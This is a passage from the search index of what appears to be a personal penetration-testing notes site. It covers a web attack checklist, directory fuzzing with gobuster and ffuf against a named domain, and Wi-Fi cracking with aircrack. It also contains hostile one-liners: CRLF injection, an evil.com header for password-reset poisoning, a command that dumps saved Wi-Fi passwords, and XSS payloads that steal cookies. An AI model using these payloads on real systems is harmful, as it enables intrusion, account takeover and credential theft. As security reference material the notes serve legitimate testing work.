Content Spoofing [+] Credential stuffing [+] Cross Frame Scripting [+] Cross Site History Manipulation (XSHM) [+] Cross Site Tracing [+] Cross-Site Request Forgery (CSRF) [+] Cross Site Port Attack (XSPA) [+] Cross-Site Scripting (XSS) [+] Cross-User Defacement [+] Custom Special Character Injection [+] Denial of Service [+] Direct Dynamic Code Evaluation (‚ÄòEval Injection‚Äô) [+] Execution After Redirect (EAR) [+] Exploitation of CORS [+] Forced browsing [+] Form action hijacking [+] Format string attack [+] Full Path Disclosure [+] Function Injection [+] Host Header injection [+] HTTP Response Splitting [+] HTTP verb tampering [+] HTML injection [+] LDAP injection [+] Log Injection [+] Man-in-the-browser attack [+] Man-in-the-middle attack [+] Mobile code: invoking untrusted mobile code [+] Mobile code: non-final public field [+] Mobile code: object hijack [+] One-Click Attack [+] Parameter Delimiter [+] Page takeover [+] Path Traversal [+] Reflected DOM Injection [+] Regular expression Denial of Service ‚Äì ReDoS [+] Repudiation Attack [+] Resource Injection [+] Server-Side Includes (SSI) Injection [+] Session fixation [+] Session hijacking attack [+] Session Prediction [+] Setting Manipulation [+] Special Element Injection [+] SMTP injection [+] SQL Injection [+] SSI injection [+] Traffic flood [+] Web Parameter Tampering [+] XPATH Injection [+] XSRF or SSRF [+] Image mime type injection [+] DNS [+] CRLF [+] 2FA [+] XSS [+] CSRF [+] SOP [+] SSRF [+] LFI \u0026amp; RFI [+] SQLi [+] File Upload [+] XXE [+] LDAP [+] MongoDB [+] IDOR [+] Web Socket [+] Click Jacking [+] No rate limit [+] CMDI [+] Directory Traversal [+] HTTP Request Smugling [+] Subdomain Takeover [+] Wordpress [+] Joomla [+] Drupal [+] HSTS [+] Host Header Attack [+] Password reset [+] Session Management [+] Github [+] HeartBleed [+] SSI [+] Recon [+] URL Rerdirect [+] HTMLi [+] SPF recored [+] Critical File Found [+] Source Code Disclosure ", 
        "url": "\/web-application-penetration-test-checklist\/"
    },
    
    
    
    "\/web-fuzzing-techniques\/": {
        
        "title": "Web Fuzzing Techniques",
        "tags": [],
        "content": " Use SecList seed fuzz Use FuzzDB seed fuzz Note: You don\u0026rsquo;t have to clone SecList¬†in your $HOME directory. Just create a symlink from your preferable directory (ie. ln -s ~/util/SecLists ~/SecLists).\nUsing Gobuster || FFuF Gobuster fuzzing:\ncat ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \\ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \\ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/common.txt | gobuster fuzz -u \\ https://www.utic.ba/FUZZ -b 404 -w - -k -t 30 Extending Gobuster with POSIX:\nGood trick for extending gobuster is by using POSIX seq command. To exclude specific length from the output, gobuster requires param: --exclude-length \u0026lt;len\u0026gt;,\u0026lt;len\u0026gt; which would require a lot of work for small byte diff. Use seq to generate such sequences.\n$ seq -s \u0026#34;,\u0026#34; 1500 1510 # 1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510 # # then: # gobuster -u \u0026lt;url\u0026gt; --exclude-length \u0026lt;generated_sequence\u0026gt; ffuf fuzzing:\ncat ~/SecLists/Discovery/Web-Content/apache.txt \\ ~/SecLists/Discovery/Web-Content/ApacheTomcat.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \\ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \\ ~/SecLists/Discovery/Web-Content/common.txt \\ ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \\ ~/SecLists/Discovery/Web-Content/dirsearch.txt \\ ~/SecLists/Discovery/Web-Content/frontpage.txt \\ ~/SecLists/Discovery/Web-Content/golang.txt \\ ~/SecLists/Discovery/Web-Content/graphql.txt \\ ~/SecLists/Discovery/Web-Content/IIS.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/Jenkins-Hudson.txt \\ ~/SecLists/Discovery/Web-Content/Logins.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/nginx.txt \\ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/quickhits.txt \\ ~/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt \\ ~/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt \\ ~/SecLists/Discovery/Web-Content/spring-boot.txt \\ ~/SecLists/Discovery/Web-Content/RobotsDisallowed-Top1000.txt \\ ~/SecLists/Discovery/Web-Content/swagger.txt \\ ~/SecLists/Discovery/Web-Content/CMS/Django.txt \\ ~/SecLists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/CMS/symfony-315-demo.txt | ffuf -w - -u https://utic.ba/FUZZ -mc 200,204,301,302,307,401,405 -fs 0 ffuf fuzzing for SVN/GIT/Rand_PHP:\ncat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \\ ~/SecLists/Discovery/Web-Content/CMS/symfony-315-demo.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/symfony.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/all.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/all-dirs.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/error.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/index.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/install.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/readme.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/setup.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/test.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/debug.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/admin.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/conf.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/config.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/htaccess.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/inc.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/ini.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/sql.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/xml.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/js.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/html.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/jar.txt \\ ~/SecLists/Discovery/Web-Content/api/actions-lowercase.txt \\ ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \\ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \\ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/common.txt | ffuf -w - -u https://utic.ba/FUZZ -mc 200,204,301,302,307,401,403,405 -fs 0 Fuzz List # =\u0026gt; Symfony / Laravel Framework Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt Discovery/Web-Content/CMS/symfony-315-demo.txt Discovery/Web-Content/SVNDigger/symfony.txt # =\u0026gt; many stuff Discovery/Web-Content/SVNDigger/all.txt Discovery/Web-Content/SVNDigger/all-dirs.txt Discovery/Web-Content/SVNDigger/context/error.txt Discovery/Web-Content/SVNDigger/context/index.txt Discovery/Web-Content/SVNDigger/context/install.txt Discovery/Web-Content/SVNDigger/context/readme.txt Discovery/Web-Content/SVNDigger/context/root.txt Discovery/Web-Content/SVNDigger/context/setup.txt Discovery/Web-Content/SVNDigger/context/test.txt Discovery/Web-Content/SVNDigger/context/debug.txt Discovery/Web-Content/SVNDigger/context/admin.txt Discovery/Web-Content/SVNDigger/cat/Conf/conf.txt Discovery/Web-Content/SVNDigger/cat/Conf/config.txt Discovery/Web-Content/SVNDigger/cat/Conf/htaccess.txt Discovery/Web-Content/SVNDigger/cat/Database/inc.txt Discovery/Web-Content/SVNDigger/cat/Database/ini.txt Discovery/Web-Content/SVNDigger/cat/Database/sql.txt Discovery/Web-Content/SVNDigger/cat/Database/xml.txt Discovery/Web-Content/SVNDigger/cat/Language/php.txt Discovery/Web-Content/SVNDigger/cat/Language/js.txt Discovery/Web-Content/SVNDigger/cat/Language/html.txt Discovery/Web-Content/SVNDigger/cat/Language/jar.txt Discovery/Web-Content/api/actions-lowercase.txt # =\u0026gt; ruby https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/Ruby_Rails.txt # =\u0026gt; mostly php stuff Discovery/Web-Content/Common-DB-Backups.txt # =\u0026gt; good stuff Discovery/Web-Content/Common-PHP-Filenames.txt # =\u0026gt; good stuff Discovery/Web-Content/PHP.fuzz.txt # =\u0026gt; good for phpmyadmins Discovery/Web-Content/common.txt # =\u0026gt; usual stuff like .git/.rc-s/dotfiles https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/php_files_only.txt # =\u0026gt; more php # =\u0026gt; mostly api Discovery/Web-Content/swagger.txt # =\u0026gt; find swagger location Discovery/Web-Content/api/api_endpoints.txt # =\u0026gt; api endpoints # =\u0026gt; all web extensions are available below: Discovery/Web-Content/web-extensions.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/filename-dirname-bruteforce/CommonWebExtensions.txt # =\u0026gt; also this one for backups https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/backup_files_only.txt https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/log_files_only.txt # =\u0026gt; for login/admin pages https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/Logins.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/cfm.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/html.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/jsp.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/php.txt # =\u0026gt; webservers https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/Apache.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/ApacheTomcat.txt # =\u0026gt; other ... https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/UnixDotfiles.txt ", 
        "url": "\/web-fuzzing-techniques\/"
    },
    
    
    
    "\/web-penetration-testing-oneliners\/": {
        
        "title": "Web Penetration Testing Oneliners",
        "tags": [],
        "content": " Also See Check if vhost is a live on specific DNS or subdomain:\ncurl -s -H \u0026#34;Host. $SUBDOMAIN.EXAMPLE.BA\u0026#34; http://example.ba Other techniques described in vhost enumeration\nRedirect URI with a Set-Cookie in GET request:\nhttp://$EXAMPLE.BA/index.php?redirect_url=/%3f%0d%0a%09set-cookie:+hello=yoyoo Rate Limit Bypass\nHeaders: * X-Forwarded-Host: http://evil.com (Password reset poisoning) * X-Forwarded-For: 127.0.0.* (Rate Limit Bypass) Permutations: * Null byte techniques * Case sensitiveness Some other techniques can be used, ie. 403 bypass via header manipulation.\nCaptcha Bypass Tricks üòÇ\nCaptcha Bypass is described in separate page.\nAlso See Checklists are provided for both REST API Issue Library as well as Web Issue Library API Abuse and Reuse 403 Bypass ", 
        "url": "\/web-penetration-testing-oneliners\/"
    },
    
    
    
    "\/wifi-cracking-via-aircrack\/": {
        
        "title": "Wifi Cracking via Aircrack",
        "tags": [],
        "content": "Deploy Aircrack for cracking WPA2 / WEP in 10 seconds. Written and based on MacOS host.\n# =\u0026gt; install macports ... # =\u0026gt; install aircrack-ng $ sudo port install aircrack-ng # =\u0026gt; install latest XCode, with all Command Line Tools ... # =\u0026gt; create the following symlink $ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport # =\u0026gt; identity channel to sniff $ sudo airport -s # =\u0026gt; in another terminal $ sudo airport en1 sniff [CHANNEL] # =\u0026gt; in another terminal $ aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE] Note that the cap_file will be located in the /tmp/airportSniff*.cap.\nDeploy Aircrack for Ubuntu 16.04, you will need to fix AlfaNetwork drivers.\n$ echo \u0026#34;options rt2800pci nohwcrypt=1\u0026#34; | sudo tee /etc/modprobe.d/rt2800pci.conf $ sudo modprobe -rfv rt2800pci $ sudo modprobe -v rt2800pci ", 
        "url": "\/wifi-cracking-via-aircrack\/"
    },
    
    
    
    "\/windbg-cheatsheets\/": {
        
        "title": "WinDbg Cheatsheets",
        "tags": [],
        "content": "Just personal things related to my frustration with WinDbg (:\nThe symbol search path tells WinDbg where to look for symbol (PDB) files. The debugger needs symbol files to obtain information about code modules (function names, variable names, and the like).\n.sympath srv* Symbol search path is: srv* Expanded Symbol search path is: cache*;SRV To see the symbols for the Notepad.exe module, enter this command:\nx notepad:! Note, if ytou don7t see any output, enter .reload again:\nx notepad!*main* # =\u0026gt; 000000d0`428ff7e8 00007ff6`3282122f notepad!WinMain To put a breakpoint at notepad!WinMain, enter this command:\nbu notepad!WinMain To verify that your breakpoint was set, enter this command:\nbl # =\u0026gt; 00007ff6`32825f64 0001 (0001) 0:**** notepad!WinMain Start the process:\ng # =\u0026gt; ... # Breakpoint 0 hit # notepad!WinMain: # 00007ff6`32825f64 488bc4 mov rax,rsp To see a list of code modules that are loaded in the Notepad process, enter this command:\nlm # =\u0026gt; ... # 0:000\u0026gt; lm # start end module name # 00007ff6`32820000 00007ff6`3285a000 notepad (pdb symbols) C:\\...\\notepad.pdb # 00007ffc`ab7e0000 00007ffc`ab85b000 WINSPOOL (deferred) ... To see a stack trace, enter this command:\nk # =\u0026gt; ... # Child-SP RetAddr Call Site # 00000048`4e0cf6a8 00007ff6`3282122f notepad!WinMain # 00000048`4e0cf6b0 00007ffc`b1cf16ad notepad!WinMainCRTStartup+0x1a7 # 00000048`4e0cf770 00007ffc`b1fc4629 KERNEL32!BaseThreadInitThunk+0xd # 00000048`4e0cf7a0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d ... To break in the Notepad, choose Break from the Debug Menu.\nDebug Menu -\u0026gt; Break To set and verify a breakpoint at ZwWriteFile, enter these commands:\nbu ntdll!ZwWriteFile bl To see a list of all threads in Notepapd process, enter this command (tilde):\n~ # =\u0026gt; # 0:011\u0026gt; ~ # 0 Id: 10c8.128c Suspend: 1 Teb: 00007ff6`31cdd000 Unfrozen To look at the stack trace for thread 0, enter these commands:\n~0s k # =\u0026gt; 0:011\u0026gt; ~0s USER32!SystemParametersInfoW: 00007ffc`b12a4d20 48895c2408 mov qword ptr [rsp+8], ... 0:000\u0026gt; k Child-SP RetAddr Call Site 00000033`d1e9da48 00007ffc`adfb227d USER32!SystemParametersInfoW (Inline Function) --------`-------- uxtheme!IsHighContrastMode+0x1d 00000033`d1e9da50 00007ffc`adfb2f12 uxtheme!IsThemeActive+0x4d ... 00000033`d1e9f810 00007ffc`b1cf16ad notepad!WinMainCRTStartup+0x1a7 00000033`d1e9f8d0 00007ffc`b1fc4629 KERNEL32!BaseThreadInitThunk+0xd 00000033`d1e9f900 00000000`00000000 ntdll!RtlUserThreadStart+0x1d To quit and detach from process:\nqd References\nwindbg-scripts ", 
        "url": "\/windbg-cheatsheets\/"
    },
    
    
    
    "\/windows-notes\/": {
        
        "title": "Windows Notes",
        "tags": [],
        "content": "When setting up Reverse Engineering workstation, use retoolkit for a start kit.\nExtract WiFi cleartextr password\ncls \u0026amp; echo. \u0026amp; for /f \u0026#34;tokens=4 delims=: \u0026#34; %a in (\u0026#39;netsh wlan show profiles ^| find \u0026#34;Profile \u0026#34;\u0026#39;) do @echo off \u0026gt; nul \u0026amp; (netsh wlan show profiles name=%a key=clear | findstr \u0026#34;SSID Cipher Content\u0026#34; | find /v \u0026#34;Number\u0026#34; \u0026amp; echo.) \u0026amp; @echo on Active Directory\nAccess Active Directory Domain Admin via Linux:\n$ sudo apt-get realmd $ realm join example.ba --user username See also Linux Notes\nResource:\nAD Attack-Defense Windows Data Hunting ", 
        "url": "\/windows-notes\/"
    },
    
    
    
    "\/wireshark\/": {
        
        "title": "Wireshark",
        "tags": [],
        "content": "Wireshark, whose old name is Ethereal; It is a program that can run in many operating systems such as Windows, Linux, MacOS or Solaris and can analyze all the traffic going to network cards connected to computer. Analyze over 750 protocols Can capture packets and save them to a file.\nLogical operators are available for all filterings:\nExample: http \u0026amp; ip.src == 192.168.0.1 Management Frame: The frame for the connection between the network device and the client. Control Frame: Controls the integrity of data traffic between the network device and the client. Data Frame: The frame on which the original data is transferred. Only to show the outgoing packets from the management frame.\nwlan.fc.type==0 To show incoming, outgoing packets through control frame.\nwlan.fc.type==1 To show packets transferred over the data frame.\nwlan.fc.type==2 Association lists the requests.\nwlan.fc.type_subtype==0 Association lists the answers.\nwlan.fc.type_subtype==1 Probe lists requests.\nwlan.fc.type_subtype==4 Lists the probe responses.\nwlan.fc.type_subtype==5 Lists Beacon signals / waves.\nwlan.fc.type_subtype==8 Lists the Authentication requests.\nwlan.fc.type_subtype==11 Lists deauthentication requests.\nwlan.fc.type_subtype==12 TCP lists the outgoing packets to the xx port.\ntcp.port == xx TCP lists packages with the Source xx port.\ntcp.srcport == xx TCP lists packages with a destination xx port.\ntcp.dstport == xx UDP lists the outgoing packets to the xx port.\nudp.port == xx UDP lists packets with a destination xx port.\nudp.srcport == xx UDP lists packages that have the Source xx port.\nudp.dstport == xx Lists the HTTP Get requests.\nhttp.request Lists packages for the source or destination mac address.\nwlan.addr == MAC-Address The source lists packages that have a mac address.\nwlan.sa == MAC-Address Lists packages that have a target mac address.\nwlan.da == MAC-Address ", 
        "url": "\/wireshark\/"
    },
    
    
    
    "\/xss-payloads\/": {
        
        "title": "XSS Payloads",
        "tags": [],
        "content": "JSON: {\u0026#34;email\u0026#34;:\u0026#34;some@email.com\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)//\u0026#34;} The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE. https://inventory.upserve.com/login/?\u0026#39;\u0026#34;--\u0026gt;\u0026lt;script\u0026gt;confirm(document.cookie)\u0026lt;/script\u0026gt; In URL PATH: \u0026#34;accesskey=\u0026#39;x\u0026#39; onclick=\u0026#39;confirm`1`\u0026#39; // Hi\u0026#39;\u0026amp;gt;\u0026#34;\u0026lt;script src=\u0026#34;//xss-server\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;x=\u0026#34;{9*9}\\r\\n%0a%09%0d\u0026lt;svg\\onload=confirm(1)\u0026gt; ", 
        "url": "\/xss-payloads\/"
    },
    
}
</script>


<script src="/js/lunr.min.js" type="text/javascript"></script>


<script src="/js/search.js" type="text/javascript"></script>
</body>
</html>
